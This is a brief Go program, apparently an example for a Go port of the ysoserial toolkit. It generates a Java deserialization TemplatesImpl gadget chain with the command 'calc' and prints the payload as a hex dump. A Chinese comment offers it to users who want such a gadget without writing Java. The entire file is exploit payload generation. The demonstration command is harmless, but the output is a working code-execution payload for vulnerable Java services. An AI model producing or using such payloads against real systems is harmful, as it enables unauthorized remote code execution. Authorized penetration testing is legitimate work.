package main

import (
	"encoding/hex"
	"fmt"
	ysoserial "github.com/nu1r/GlangYsoserial/Gadget"
)

func main() {

	// 如果你需要使用使用 TemplatesImpl 类实现的Gadget, 但是又懒得去JAVA实现后输出，可以调用 TemplatesImpl 函数的返回值作为参数
	fmt.Println(hex.Dump(ysoserial.TemplatesImpl("calc")))
}
